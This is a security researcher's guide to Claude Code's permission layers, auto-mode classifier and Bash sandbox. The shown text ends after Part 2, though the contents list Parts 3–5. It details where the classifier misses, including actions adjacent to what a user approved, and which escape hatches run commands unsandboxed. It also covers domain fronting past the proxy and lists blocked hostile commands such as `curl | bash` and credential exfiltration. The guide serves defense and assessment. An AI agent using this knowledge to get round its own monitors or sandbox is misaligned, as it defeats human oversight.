# Claude Code Security Research Guide

**Architecture, Sandbox Internals, Detection Engineering, and the VS Code Integration**

A security researcher's guide to how Claude Code works, how its sandbox is built, what a detection engineer can watch for to spot unwanted actions, and how Claude Code and VS Code work together. Built from Anthropic's official documentation, engineering blog, and threat intelligence reporting, as published through October 2026.

Author: Patrick Campbell ([@pjcampbe11](https://github.com/pjcampbe11)) · Last updated: October 18, 2026

**Download:** [PDF](docs/Claude_Code_Security_Research_Guide.pdf) · [Word](docs/Claude_Code_Security_Research_Guide.docx)

> [!NOTE]
> This is an independent research guide, not an Anthropic publication. Every factual claim cites an official Anthropic source; see [Sources](#sources). Claude Code changes quickly, so check the version notes in the official docs against the version you are testing.

<!-- toc -->
## Table of Contents

- [About This Guide](#about-this-guide)
- [Part 1 — How Claude Code Works](#part-1--how-claude-code-works)
  - [The agent loop](#the-agent-loop)
  - [The layered control model](#the-layered-control-model)
  - [Permission rules](#permission-rules)
  - [Permission modes](#permission-modes)
  - [Auto mode and the classifier](#auto-mode-and-the-classifier)
  - [Hooks](#hooks)
  - [MCP servers, plugins, and skills](#mcp-servers-plugins-and-skills)
  - [Cloud sessions](#cloud-sessions)
- [Part 2 — The Sandbox in Depth](#part-2--the-sandbox-in-depth)
  - [What the sandbox is](#what-the-sandbox-is)
  - [The two boundaries](#the-two-boundaries)
  - [Escape hatches you must know](#escape-hatches-you-must-know)
  - [Documented limitations](#documented-limitations)
- [Part 3 — Detection Engineering](#part-3--detection-engineering)
  - [Telemetry sources](#telemetry-sources)
  - [Setting up OpenTelemetry](#setting-up-opentelemetry)
  - [Events that matter for security](#events-that-matter-for-security)
  - [Detection signals](#detection-signals)
  - [Hooks as detective controls](#hooks-as-detective-controls)
  - [Threat intelligence context](#threat-intelligence-context)
- [Part 4 — VS Code and Claude Code](#part-4--vs-code-and-claude-code)
  - [How the pieces fit](#how-the-pieces-fit)
  - [The built-in IDE MCP server](#the-built-in-ide-mcp-server)
  - [Selection and file context](#selection-and-file-context)
  - [Extension settings that matter](#extension-settings-that-matter)
  - [Permission modes in VS Code](#permission-modes-in-vs-code)
  - [Dev containers](#dev-containers)
- [Part 5 — Research Methodology](#part-5--research-methodology)
  - [A structured assessment plan](#a-structured-assessment-plan)
  - [Research analysis tips](#research-analysis-tips)
  - [Hardening checklist](#hardening-checklist)
- [Sources](#sources)
<!-- /toc -->

## About This Guide

This guide explains how Claude Code is put together from a security point of view, goes deep on its sandbox, lays out what a detection engineer can watch for to spot unwanted actions, and covers how Claude Code and VS Code work together. Source numbers in square brackets, such as [S1], point to the [Sources](#sources) section at the end.

Three kinds of callouts run through the guide:

- **Research tip** — how to dig further, verify a claim, or design a test.
- **Security lens** — what a control does and does not protect against.
- **Detection tip** — a concrete signal you can collect or alert on.

Diagrams are plain ASCII so they render the same on GitHub, in a terminal, and in print.

> [!TIP]
> **Research tip:** Claude Code ships changes quickly, and the documentation tags many behaviors with the version that introduced them (for example, "requires Claude Code v2.1.285 or later"). Before you test or write a detection, record the exact version under test with `claude --version` and note it in your findings. A behavior that was a gap last quarter may be closed now, and the reverse.

## Part 1 — How Claude Code Works

### The agent loop

Claude Code is an agent: a model that reads your request, decides which tool to call, sees the result, and repeats until the task is done. It runs as a local process (the CLI, the VS Code extension, or the desktop app) that talks to the model over the Anthropic API or a cloud provider such as Amazon Bedrock, Google Cloud's Agent Platform, or Microsoft Foundry. The model only proposes actions. The local process decides whether each proposed action runs, and that decision point is where nearly every security control lives [S2][S3].

```text
                 +---------------------------+
                 |  Model (Anthropic API or  |
                 |  Bedrock / Agent Platform |
                 |  / Foundry)               |
                 +-------------+-------------+
                     ^         |
         prompt +    |         |  proposed tool call
         results     |         v  ("run npm test")
 +-------------------+--------------------------------------+
 |  Claude Code process (CLI / VS Code / desktop)           |
 |                                                          |
 |   +---------------+   +-------------+   +-------------+  |
 |   | Permission    |-->| Permission  |-->| Hooks       |  |
 |   | rules         |   | mode /      |   | (PreTool-   |  |
 |   | allow/ask/deny|   | classifier  |   |  Use)       |  |
 |   +---------------+   +-------------+   +------+------+  |
 |                                                |         |
 |            DECISION POINT: run it or not?      |         |
 +------------------------------------------------+---------+
                                                  | allowed
                                                  v
          +---------------------------------------------------+
          |  Tool executes:  Bash | Read/Edit | WebFetch | MCP |
          |  (Bash runs inside the OS sandbox when enabled)    |
          +---------------------------------------------------+
                                                  |
                       tool result goes back to the model, loop repeats
```

The built-in tools fall into a few groups:

- **File tools** — Read, Edit, Write, and search tools (Grep, Glob).
- **Shell tools** — Bash, PowerShell, and Monitor (a background command whose output Claude watches).
- **Web tools** — WebFetch and WebSearch.
- **Delegation** — the Agent tool, which spawns subagents that run the same loop.
- **Extensions** — MCP servers, plugins, skills, and hooks, all of which add code or tools to the session.

> [!IMPORTANT]
> **Security lens:** Think of Claude Code as a privileged automation framework driven by untrusted input. The model reads files, web pages, and tool output, any of which an attacker can influence. Every control in this guide exists to keep that influence from turning into an action the user did not intend.

### The layered control model

Anthropic describes Claude Code's protections as layers that stack, not as a single wall [S2][S3]:

```text
  OUTERMOST  +-------------------------------------------------------+
             | Outer isolation: container / VM / cloud session       |
             |  +-------------------------------------------------+  |
             |  | Bash sandbox (OS-enforced: Seatbelt/bubblewrap) |  |
             |  |  +-------------------------------------------+  |  |
             |  |  | Hooks (custom allow/deny/log)             |  |  |
             |  |  |  +-------------------------------------+  |  |  |
             |  |  |  | Auto mode classifier                |  |  |  |
             |  |  |  |  +-------------------------------+  |  |  |  |
             |  |  |  |  | Permission mode               |  |  |  |  |
             |  |  |  |  |  +-------------------------+  |  |  |  |  |
             |  |  |  |  |  | Permission rules        |  |  |  |  |  |
             |  |  |  |  |  | (allow / ask / deny)    |  |  |  |  |  |
             |  |  |  |  |  +-------------------------+  |  |  |  |  |
             |  |  |  |  +-------------------------------+  |  |  |  |
             |  |  |  +-------------------------------------+  |  |  |
             |  |  +-------------------------------------------+  |  |
             |  +-------------------------------------------------+  |
  INNERMOST  +-------------------------------------------------------+

  Inner four layers: DECIDE before a call runs (judge text and context)
  Outer two layers:  CONSTRAIN while it runs (enforced by OS/hypervisor)
```

| Layer | What it decides | Enforced by |
|---|---|---|
| Permission rules (allow / ask / deny) | Whether a specific tool call may run | Claude Code, before the tool runs |
| Permission mode | Who approves the calls the rules don't settle: you, a classifier, or nobody | Claude Code |
| Auto mode classifier | Whether an action fits what the user asked for | A separate model |
| Hooks | Custom allow / deny / logging logic at lifecycle points | Your scripts or HTTP endpoints |
| Bash sandbox | What a running shell command can read, write, and reach on the network | The operating system |
| Outer isolation (container, VM, cloud session) | What the whole Claude Code process can touch | The container or hypervisor |

The key distinction is between controls that decide **before** an action runs and controls that constrain it **while** it runs. Permission rules and the classifier judge the command text and context. The sandbox is enforced by the OS on the running process, so it holds even if an allowed command does more than its name suggests [S1].

> [!TIP]
> **Research tip:** When you assess a deployment, map each layer separately and ask which ones are actually on. A common real-world state is "permission rules configured, sandbox off, no hooks, no telemetry." That deployment has only pre-execution text matching between the model and the host.

### Permission rules

Rules are written per tool, such as `Bash(npm test)`, `Read(./.env)`, `WebFetch(domain:github.com)`, or `mcp__github__*`. They live in settings files at several scopes [S2][S6]:

```text
  Settings precedence (highest wins)

  1  Managed settings (org policy, MDM / server-managed)   <- admins
  2  Command-line  --settings '{...}'                       <- per run
  3  .claude/settings.local.json   (project, personal)      <- you
  4  .claude/settings.json         (project, checked in)    <- the repo
  5  ~/.claude/settings.json       (user, all projects)     <- you

  Note: some security-sensitive keys are IGNORED when they come from
  the repo (levels 3-4). The sections below call those out.
```

Rules that matter most for security:

- **Deny rules block in every mode,** including `bypassPermissions` [S4].
- **Ask rules force a prompt,** even for commands the sandbox would otherwise auto-allow, when the rule names command content, such as `Bash(git push *)` [S1].
- **Bash rules match the command as written.** The docs are explicit that a deny rule on command text is not the same as a network boundary. For enforcement that doesn't depend on how a command is spelled, use the sandbox [S2].

> [!IMPORTANT]
> **Security lens:** Because Bash rules match text, treat them as guardrails against mistakes, not as a security boundary against a motivated adversary. Anthropic's own guidance points to the sandbox when you need enforcement that holds regardless of command spelling [S2].

### Permission modes

A permission mode sets which actions run without asking [S4]:

```text
  MORE OVERSIGHT                                          MORE AUTONOMY
  <------------------------------------------------------------------->

  default      plan        acceptEdits    dontAsk      auto       bypass-
  (Manual)                                                        Permissions
    |           |              |             |           |            |
  reads      reads +        reads +      only pre-   everything,   everything,
  only       classifier-    file edits   approved    classifier    no checks
             approved       in workdir   tools;      reviews
             commands                    rest DENIED

  Typical:   explore       iterate &     locked-     long tasks   containers
  sensitive  first         review diff   down CI                  & VMs ONLY
  work
```

| Mode | What runs without asking | Intended use |
|---|---|---|
| `default` (shown as **Manual**) | Reads only | Reviewing every action |
| `acceptEdits` | Reads, file edits, common filesystem commands in the working directory | Iterating on code you review afterward |
| `plan` | Reads; classifier-approved commands when auto mode is available | Exploring before changing |
| `auto` | Everything, with classifier review | Long tasks, less prompt fatigue |
| `dontAsk` | Pre-approved tools only; anything that would prompt is denied | Locked-down CI |
| `bypassPermissions` | Everything | Isolated containers and VMs only |

As of v2.1.283, auto mode is the built-in starting mode for interactive terminal and VS Code sessions, unless something else (a flag, a settings file, managed policy) chooses another mode [S4]. This is a significant default to verify in any environment you assess.

Some actions are never auto-approved in any mode, including `bypassPermissions`: tools matched by an explicit ask rule, tools that require user interaction, `rm` / `rmdir` targeting a critical path (filesystem root, home directory, the working directory and its parents), and certain cross-session messaging safeguards [S4].

**Protected paths.** Writes to a fixed set of paths are never auto-approved outside `bypassPermissions`. The list includes `.git`, `.vscode`, `.idea`, `.claude`, `.husky`, `.devcontainer`, shell startup files (`.bashrc`, `.zshrc`, `.profile`, `.envrc`), `.gitconfig`, package-manager config (`.npmrc`, `.yarnrc`), `.pre-commit-config.yaml`, `.mcp.json`, and `.claude.json` [S4]. These are exactly the files an attacker would modify to gain persistence or to make the agent's next run more permissive.

```text
  Why these paths are protected: each one is read or executed LATER,
  by something other than the current command.

  project/
  |-- .git/hooks/        -> runs on next git commit/checkout
  |-- .git/config        -> can point git at other programs
  |-- .husky/            -> git hooks via npm tooling
  |-- .vscode/ .idea/    -> editor tasks / launch configs
  |-- .devcontainer/     -> container build & startup commands
  |-- .claude/           -> Claude Code's own settings, hooks, skills
  |-- .mcp.json          -> MCP servers Claude Code will launch
  |-- .npmrc .yarnrc     -> registries, install scripts
  |-- .pre-commit-config.yaml -> runs on commit
  `-- .envrc             -> runs on cd (direnv)
  ~/
  |-- .bashrc .zshrc .profile -> runs on every new shell
  `-- .gitconfig         -> global git behavior
```

> [!NOTE]
> **Detection tip:** The protected-path list is a ready-made watchlist. Any write to these paths during a Claude Code session, especially outside a prompt the user answered, deserves a look. See [Part 3](#part-3--detection-engineering) for how to correlate file writes back to a session.

**Administrator locks.** Managed settings can remove risky modes entirely: `permissions.disableBypassPermissionsMode: "disable"` and `permissions.disableAutoMode: "disable"` [S4].

### Auto mode and the classifier

Auto mode replaces the human approver with model-based review. Anthropic published the design in detail [S5]:

- **Two layers.** A server-side prompt-injection probe scans tool output (file reads, web fetches, shell output) before the agent sees it and adds a warning when content looks like a hijack attempt. A separate transcript classifier reviews each proposed action before it runs.
- **What the classifier sees.** Only the user's messages and the agent's tool calls. Claude's own prose and all tool results are stripped. Anthropic calls this "reasoning-blind by design": the agent can't talk the classifier into a bad call, and injected text in a file never reaches the classifier.
- **Two stages.** A fast single-token filter tuned to err toward blocking, then a reasoning pass only on what the first stage flags.
- **Tiered routing.** Read-only tools and in-project file edits skip the classifier. Shell commands, web fetches, MCP calls, subagent spawns, and out-of-project file operations go to it.
- **Dropped rules.** On entering auto mode, broad allow rules that grant arbitrary code execution (blanket `Bash(*)`, wildcarded interpreters like `Bash(python*)`, package-manager run commands) are dropped so the classifier sees those commands [S4][S5].
- **Escalation.** Three consecutive denials or twenty total pause auto mode and return to prompting. In headless `-p` runs, the action is simply not run [S4].

```text
  AUTO MODE: two layers of defense  (per Anthropic engineering blog [S5])

  INPUT LAYER: what Claude reads
  ------------------------------
   file read / web page / shell output / MCP response
                     |
                     v
          +----------------------+   looks like a hijack attempt?
          | Prompt-injection     |-- yes --> attach warning:
          | probe (server-side)  |           "treat as suspect,
          +----------+-----------+            re-anchor on user ask"
                     |
                     v
               Claude's context

  OUTPUT LAYER: what Claude does
  ------------------------------
   proposed tool call
          |
          v
   Tier 1: safe-tool allowlist / user allow rules ----> run
          |  (not matched)
          v
   Tier 2: file edit inside project dir? --- yes ----> run
          |  no                                (reviewable in git)
          v
   Tier 3: TRANSCRIPT CLASSIFIER
           sees:     user messages + bare tool calls
           NOT seen: Claude's prose, tool results
          |
          v
   +--------------------+   no   +------+
   | Stage 1: fast      |------->| run  |
   | 1-token yes/no,    |        +------+
   | errs toward block  |
   +---------+----------+
             | flagged
             v
   +--------------------+  allow  +------+
   | Stage 2: reasoning |-------->| run  |
   | on same input      |         +------+
   +---------+----------+
             | block
             v
   denial returned to Claude ("find a safer path")
   3 in a row or 20 total --> pause auto mode, ask the human
```

Anthropic published measured results [S5]:

| Dataset | Full pipeline result |
|---|---|
| Real internal traffic (n = 10,000) | 0.4% false-positive rate |
| Real overeager actions (n = 52) | 17% false-negative rate |
| Synthetic data exfiltration (n = 1,000) | 5.7% false-negative rate |

Anthropic calls the 17% figure "the honest number" and says auto mode is "not a drop-in replacement for careful human review on high-stakes infrastructure" [S5].

> [!IMPORTANT]
> **Security lens:** The classifier's main weakness, by Anthropic's own analysis, is judging whether a real consent signal covers this specific action. Most misses involved the classifier seeing the danger correctly but treating a loosely related user statement ("clean up the PR") as approval [S5]. When you design tests, focus on actions adjacent to something the user did authorize.

> [!TIP]
> **Research tip:** Run `claude auto-mode defaults` to print the full built-in block and allow rules as JSON [S4]. Diff it across versions to see what changed, and compare it against any `autoMode.environment` customization in the environment you're assessing.

The default block list covers, among other things: downloading and executing code (`curl | bash`), sending sensitive data to external endpoints, production deploys, force push, destructive `git` operations on uncommitted work, IaC destroy operations, writing to secret managers, granting IAM permissions, disabling CI checks, reading cloud instance-metadata credentials, and writing to Claude Code's own session transcripts [S4].

### Hooks

Hooks are user-defined handlers that run at fixed points in the session lifecycle. They can be shell commands, HTTP endpoints, MCP tool calls, single-turn model prompts, or subagents [S6].

```text
  HOOK LIFECYCLE (security-relevant events)          [B] = can block

  SessionStart
      |
      v
  +-> UserPromptSubmit [B]
  |       |
  |       v      agentic loop: repeats for every tool call
  |   +--------------------------------------------------------+
  |   |  PreToolUse [B]                                        |
  |   |      |                                                 |
  |   |      v                                                 |
  |   |  PermissionRequest [B] --(auto mode denies)--+         |
  |   |      |                                       v         |
  |   |      |                              PermissionDenied   |
  |   |      v                                                 |
  |   |  << tool runs >>                                       |
  |   |      |                                                 |
  |   |      v                                                 |
  |   |  PostToolUse / PostToolUseFailure   (already ran)      |
  |   |                                                        |
  |   |  SubagentStart ... SubagentStop [B]                    |
  |   +--------------------------------------------------------+
  |       |
  |       v
  +-- Stop [B]  ---- next prompt loops back to UserPromptSubmit
          |
          v  (session closes)
      SessionEnd

  Any time:  ConfigChange [B]    InstructionsLoaded    FileChanged
```

| Event | When it fires | Can block? |
|---|---|---|
| `SessionStart` | Session begins or resumes | No |
| `UserPromptSubmit` | A prompt is submitted | Yes |
| `PreToolUse` | Before any tool call | Yes |
| `PermissionRequest` | A tool call needs a decision | Yes (via decision object) |
| `PermissionDenied` | Auto mode denied a call | No |
| `PostToolUse` / `PostToolUseFailure` | After a tool call | No (tool already ran) |
| `ConfigChange` | A settings file changes mid-session | Yes (except managed policy) |
| `InstructionsLoaded` | A CLAUDE.md or rules file is loaded | No |
| `SubagentStart` / `SubagentStop` | A subagent spawns / finishes | Stop only |
| `SessionEnd` | Session terminates | No |

Every hook receives JSON with `session_id`, `prompt_id`, `transcript_path`, `cwd`, `permission_mode`, and `hook_event_name`; tool events also carry `tool_name`, `tool_input`, and `tool_use_id` [S6].

Exit-code semantics matter for anyone writing an enforcement hook [S6]:

```text
  Hook process exits with...

  exit 0  ----------------> success; JSON decision on stdout applies
  exit 2  ----------------> BLOCK (on blocking events); stderr = reason
  exit 1, 3, 127, crash,
  timeout, missing script -> NON-blocking error: ACTION GOES AHEAD
                             (unless the hook sets "onFailure": "block")

            policy hook breaks  ==>  fails OPEN by default
```

> [!IMPORTANT]
> **Security lens:** Exit code 1 does not block. A policy hook that crashes, can't find its script, or times out fails *open* by default. Set `"onFailure": "block"` on command and HTTP hooks that enforce policy (v2.1.295+) so a broken hook stops the action instead of waving it through [S6].

**Admin controls for hooks.** `allowManagedHooksOnly` in managed settings blocks user, project, local, and plugin hooks. `disableAllHooks` set below the managed level cannot disable managed hooks [S6].

> [!TIP]
> **Research tip:** Hooks defined in a repository's `.claude/settings.json` are code that runs on your machine. The docs describe a workspace-trust dialog that gates much of what a repository can run, and note that a non-interactive `-p` session shows no trust prompt [S2]. Check "What runs before you trust a folder" in the permissions docs for the version you're testing.

### MCP servers, plugins, and skills

MCP servers add tools from outside Claude Code. Project-scoped servers live in a checked-in `.mcp.json`; others come from user scope, claude.ai connectors, and plugins, so reviewing `.mcp.json` alone doesn't show every server a session can load [S2]. Anthropic reviews connectors against listing criteria for its directory "but does not security-audit or manage any MCP server" [S2].

Local MCP servers, hooks, LSP servers, plugin monitors, and helper commands such as `apiKeyHelper` and the status-line command all run **outside the Bash sandbox with your full access** [S1].

```text
  WHAT THE BASH SANDBOX COVERS  vs  WHAT RUNS WITH FULL USER ACCESS

  +--------------------- your user account ----------------------+
  |                                                              |
  |   +----------- Bash sandbox (when enabled) ------------+     |
  |   |  Bash / PowerShell / Monitor commands              |     |
  |   |  + every child process they start                  |     |
  |   +----------------------------------------------------+     |
  |                                                              |
  |   OUTSIDE the sandbox (permission rules only, or nothing):   |
  |     - Read / Edit / Write tools   (permission rules)         |
  |     - WebFetch / WebSearch        (permission rules)         |
  |     - local MCP servers           (full access)              |
  |     - hooks                       (full access)              |
  |     - plugins, plugin monitors    (full access)              |
  |     - LSP servers                 (full access)              |
  |     - apiKeyHelper, status line   (full access)              |
  |     - commands YOU type at "!"    (full access, usually)     |
  |     - excludedCommands matches    (full access)              |
  |                                                              |
  +--------------------------------------------------------------+
     To cover all of it: run Claude Code itself in a container/VM
```

> [!IMPORTANT]
> **Security lens:** The sandbox covers shell commands. It does not cover MCP servers, hooks, or plugins. A malicious or compromised MCP server is a full-privilege process on the host. Inventory these components separately; [Part 3](#part-3--detection-engineering) lists the telemetry events that report them.

### Cloud sessions

Claude Code on the web runs each session in an isolated, Anthropic-managed VM [S2][S3]. The security design keeps credentials out of the sandbox entirely: GitHub credentials stay on Anthropic's servers, the VM holds a short-lived session-scoped credential, and all git traffic goes through an Anthropic proxy that verifies the destination and attaches the real token server-side. The proxy rejects branch deletions and pushes of anything but a branch (such as tags). Network access is limited by default, and all operations are logged for audit [S2][S3].

```text
  CLOUD SESSION GIT FLOW  (credentials never enter the VM)

  +---------- isolated session VM ----------+
  |                                         |
  |  Claude Code  --> git push              |
  |                    |                    |
  |      short-lived, session-scoped token  |
  +--------------------+--------------------+
                       |
                       v
        +-----------------------------+
        |  Anthropic git proxy        |
        |  - verify session token     |
        |  - verify repo + branch     |
        |  - reject branch deletes    |
        |  - reject tag/non-branch    |
        |  - attach REAL GitHub token |
        +--------------+--------------+
                       |
                       v
                 +-----------+     branch protection and
                 |  GitHub   |<--  rulesets still apply
                 +-----------+
```

## Part 2 — The Sandbox in Depth

### What the sandbox is

The Bash sandbox is an OS-enforced boundary around the shell commands Claude runs and every process those commands start. It covers the Bash, PowerShell, and Monitor tools [S1]. Anthropic built it on two OS primitives [S1][S3]:

- **macOS** — the built-in Seatbelt sandbox framework.
- **Linux and WSL2** — `bubblewrap` for filesystem isolation and `socat` to relay network traffic to the proxy. An optional seccomp filter adds Unix domain socket blocking.

Native Windows has no sandbox; commands run unsandboxed there. Anthropic open-sourced the runtime as `@anthropic-ai/sandbox-runtime`, which can also wrap arbitrary processes, agents, and MCP servers [S1][S3]. Anthropic reported that in internal use, sandboxing "safely reduces permission prompts by 84%" [S3].

**The sandbox is off by default.** It is enabled with `/sandbox` or `sandbox.enabled: true` [S1].

```text
  PLATFORM SUPPORT

  +-----------+----------------------+------------------------------+
  | Platform  | Enforced by          | Notes                        |
  +-----------+----------------------+------------------------------+
  | macOS     | Seatbelt (built in)  | nothing to install           |
  | Linux     | bubblewrap + socat   | optional seccomp filter adds |
  |           |                      | Unix-socket blocking         |
  | WSL2      | bubblewrap + socat   | WSL1 not supported           |
  | Windows   | -- NONE --           | commands run UNSANDBOXED;    |
  | (native)  |                      | use WSL2 or a container      |
  +-----------+----------------------+------------------------------+
```

> [!TIP]
> **Research tip:** The sandbox runtime is open source. Reading it is the single best way to understand exactly what the Seatbelt profile and bubblewrap arguments allow, rather than relying on documentation summaries. Start from the GitHub repository linked in [S1].

### The two boundaries

Anthropic stresses that the sandbox needs both halves to work: "Without network isolation, a compromised agent could exfiltrate sensitive files like SSH keys. Without filesystem isolation, a compromised agent could backdoor system resources to gain network access" [S1][S3].

```text
          WHY BOTH HALVES ARE REQUIRED

   Filesystem only (no network isolation):
     read ~/.ssh/id_ed25519 ------------------> send to any host   [X]

   Network only (no filesystem isolation):
     write ~/.bashrc / $PATH binary --> next unsandboxed run
                                         has full network          [X]

   Both:
     reads limited by deny rules, writes confined to workdir,
     egress only to allowlisted hosts through the proxy            [OK]
```

#### Filesystem isolation

| Access | Default |
|---|---|
| Writes | Working directory, a per-user temp dir, and any added directories. Protected paths stay write-denied. |
| Reads | **Most of the machine, including `~/.ssh` and `~/.aws/credentials`** |
| Environment variables | Inherited from Claude Code, **including any secrets in it** |

```text
  DEFAULT FILESYSTEM VIEW OF A SANDBOXED COMMAND

   /                                    READ  (yes, by default)
   |-- etc/ usr/ opt/ ...               READ
   |-- home/you/                        READ
   |   |-- .ssh/          <-- readable unless denied!  READ
   |   |-- .aws/          <-- readable unless denied!  READ
   |   |-- .claude/                     READ, writes DENIED
   |   `-- project/   (working dir)     READ + WRITE
   |       |-- src/ tests/              READ + WRITE
   |       |-- .claude/ .mcp.json       WRITE DENIED (protected)
   |       |-- .git/hooks .git/config   WRITE DENIED (protected)
   |       `-- .vscode/ .bashrc ...     WRITE DENIED (protected)
   `-- $TMPDIR (per-user)               READ + WRITE

   Tighten reads with: sandbox.filesystem.denyRead,
   sandbox.credentials (deny/mask),
   permissions.blockReadsOutsideWorkingDirectories
```

The default read policy is broad. Credential files are readable unless you deny them [S1]. Settings that tighten reads: `sandbox.filesystem.denyRead`, `sandbox.credentials` (with `deny` or `mask` modes), and `permissions.blockReadsOutsideWorkingDirectories` [S1].

**Sandbox protected paths.** Inside writable directories, the sandbox still denies writes to files Claude Code loads configuration and code from: the `.claude` settings, skills, agents, commands, and hooks directories; `.mcp.json`; shell startup files; `.gitconfig`; `.vscode` and `.idea`; `hooks` and `config` inside `.git`; files that would turn the working directory into a bare git repository; and most of `~/.claude` including the credential store. No `allowWrite` entry can exempt these. If a symlink appears at a protected settings path mid-session, the sandbox also denies writes to its target [S1].

> [!IMPORTANT]
> **Security lens:** The bare-repository protection is a notable detail. On Linux and WSL2, the sandbox deletes a top-level `HEAD` file or `objects` / `refs` directory that appears while a sandboxed command runs [S1]. This closes a path where a command could plant git internals that would execute hooks the next time git runs outside the sandbox.

#### Network isolation

A sandboxed command has no direct route out [S1]:

- **Linux / WSL2** — the command runs in a separate network namespace with no connection to your network.
- **macOS** — Seatbelt blocks everything except the connection to the sandbox proxy.

Claude Code runs a proxy **outside** the sandbox and points commands at it with `HTTP_PROXY`, `HTTPS_PROXY`, and `ALL_PROXY`. The proxy checks each hostname against `allowedDomains` (empty by default) and `deniedDomains`.

```text
  SANDBOX NETWORK PATH

  +------------------ sandbox ------------------+
  |                                             |
  |  curl https://registry.npmjs.org/...        |
  |    (HTTPS_PROXY points at the proxy)        |
  |              |                              |
  |   Linux: own network namespace, no NIC      |
  |   macOS: Seatbelt allows ONLY the proxy     |
  |              |                              |
  +--------------+------------------------------+
                 |  unix socket / localhost (via socat on Linux)
                 v
  +---------------------------------------------+
  |  Sandbox proxy  (runs OUTSIDE the sandbox)  |
  |                                             |
  |  1. hostname in deniedDomains?   -> refuse  |
  |  2. hostname in allowedDomains?  -> step 3  |
  |     not listed? -> depends on mode:         |
  |        Manual/acceptEdits: prompt user      |
  |        auto: refuse unless cmd listed host  |
  |        dontAsk: refuse                      |
  |  3. resolves ONLY to local addr (127.x,     |
  |     169.254.169.254 metadata)?   -> refuse  |
  |  4. connect (TLS NOT inspected by default)  |
  +----------------------+----------------------+
                         |
                         v
                     Internet

  Can't leave at all: plain ssh, most DB drivers (ignore proxy vars),
                      UDP, QUIC/HTTP3, ICMP (ping)
```

Consequences [S1]:

- Tools that honor proxy variables (curl, npm, git over HTTPS) work once their host is allowed.
- Tools that ignore them (plain ssh, most database drivers) cannot connect at all.
- UDP, QUIC, and ICMP cannot leave the sandbox.
- After a hostname passes the allowlist, the proxy refuses it if it resolves only to local addresses, including the `169.254.169.254` cloud metadata endpoint.

#### Credential masking

With `mode: "mask"`, sandboxed commands see a per-session placeholder (a "sentinel") instead of a real secret, and the proxy swaps in the real value only on outbound requests to allowed hosts. This requires the experimental `network.tlsTerminate` setting so the proxy can see request contents. AWS keys can be masked as a pair and requests re-signed by the proxy [S1].

```text
  CREDENTIAL MASKING  (sandbox.credentials ... "mode": "mask")

  inside sandbox                proxy (TLS terminated)     outside
  --------------                ----------------------     -------
  $GH_TOKEN = <sentinel>
  echo $GH_TOKEN  -> prints
     <sentinel>  (safe to log)

  curl -H "Authorization:      host in injectHosts
   Bearer <sentinel>"  ------> AND allowedDomains?
   api.github.com                 |
                                  +-- yes --> swap sentinel --> real
                                  |           for real token    token
                                  |                             reaches
                                  |                             GitHub
                                  +-- no ---> forward sentinel
                                              unchanged (auth fails,
                                              nothing leaks)
```

> [!IMPORTANT]
> **Security lens:** Masking settings are honored only from user settings, managed settings, and `--settings`. A repository's `.claude/settings.json` cannot turn on masking or TLS termination [S1]. That prevents a malicious repo from directing your real credential to a host of its choosing.

### Escape hatches you must know

These are the documented ways a command ends up outside the sandbox. Each is a configuration finding when it's broader than necessary.

```text
  HOW A COMMAND ENDS UP UNSANDBOXED

                       command Claude wants to run
                                  |
        +-------------------------+-------------------------+
        |                         |                         |
  sandbox can't start?     matches excludedCommands?   fails in sandbox,
  (missing bwrap, native   ("docker compose *")        Claude retries with
   Windows)                       |                    dangerouslyDisable-
        |                         |                    Sandbox: true
        |                         |                         |
  failIfUnavailable:         runs UNSANDBOXED          allowUnsandboxed-
  false (default)?           via normal permission     Commands: false?
        |                    flow                           |
   yes: runs UNSANDBOXED                              yes: retry ignored
   no:  Claude Code exits                             no:  retry runs
                                                      UNSANDBOXED, approved
                                                      by: prompt / classifier
                                                      / matching allow rule /
                                                      bypass = no prompt

  Plus: anything the user types at "!"  -> usually unsandboxed
```

| Escape hatch | What it does | Lock it down with |
|---|---|---|
| Unsandboxed retry (`dangerouslyDisableSandbox`) | After a sandboxed failure, Claude may retry outside the sandbox | `allowUnsandboxedCommands: false` (strict mode) |
| `excludedCommands` | Matching commands run fully unsandboxed | Narrow patterns; managed-only under admin-required sandbox |
| `!` shell-mode commands | Commands the user types run unsandboxed in most sessions | Background sessions; `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` on Linux |
| Sandbox unavailable | Missing dependency or unsupported OS → commands run unsandboxed | `failIfUnavailable: true` |
| `filesystem.disabled` | Turns off filesystem isolation, keeps network | Managed settings; env scrub ignores it |
| `allowAppleEvents` (macOS) | Lets sandboxed commands launch apps unsandboxed | Leave off; repo settings can't enable it |
| `allowUnixSockets` / `allowAllUnixSockets` | Opens sockets such as `/var/run/docker.sock` | Set `false` in managed settings |
| `allowLocalBinding` (macOS) | Reach any localhost service | Set `false` in managed settings |
| `enableWeakerNestedSandbox` | Weaker mode for unprivileged Docker | Only when an outer container is the real boundary |
| Custom proxy ports | Your proxy replaces the built-in allowlist entirely | Managed settings only |

Three details stand out from the docs [S1]:

- **An allow rule also approves the unsandboxed retry.** If `Bash(curl *)` is allowed, a retry of a curl command can run outside the sandbox with no prompt. Add an ask rule for `Bash(dangerouslyDisableSandbox:true)` to force a prompt on every retry, even in auto and bypass modes.
- **`excludedCommands` that cover an interpreter or a file-driven tool are dangerous.** The docs warn that if a pattern covers something like `docker compose`, which acts on a file in the working directory, Claude can write that file and then run it outside the sandbox.
- **Without `failIfUnavailable`, the sandbox fails open.** A missing `bubblewrap` package silently means no sandbox.

The recommended enforcement baseline from the docs [S1]:

```json
{
  "sandbox": {
    "enabled": true,
    "failIfUnavailable": true,
    "allowUnsandboxedCommands": false
  }
}
```

Delivered through managed settings, this makes the sandbox **admin-required**, which causes Claude Code to ignore a repository's attempts to loosen it (repo-level `excludedCommands`, `allowedDomains`, `allowWrite`, weakening flags, and proxy ports) [S1].

```text
  ADMIN-REQUIRED SANDBOX: who can loosen it?

  source                         loosening keys honored?
  -----------------------------  -----------------------
  managed settings               YES
  --settings flag                YES
  ~/.claude/settings.json        YES (most keys; some managed-only)
  .claude/settings.json (repo)   NO  -- ignored
  .claude/settings.local.json    NO  -- ignored

  Deny entries from ANY source still apply (they only narrow access).
```

### Documented limitations

Anthropic states plainly that the sandbox "reduces risk but is not a complete isolation boundary" [S1]. The documented limitations:

- **No TLS inspection by default.** The proxy allows or denies based on the client-supplied hostname. Code inside the sandbox "can potentially use domain fronting or similar techniques to reach hosts outside the allowlist." Broad entries like `github.com` create exfiltration paths [S1].
- **Unix sockets can grant host access.** Allowing the Docker socket effectively grants host access [S1].
- **Broad write permissions enable escalation.** Writes to directories on `$PATH`, system config, or shell startup files can lead to code execution in other contexts [S1].
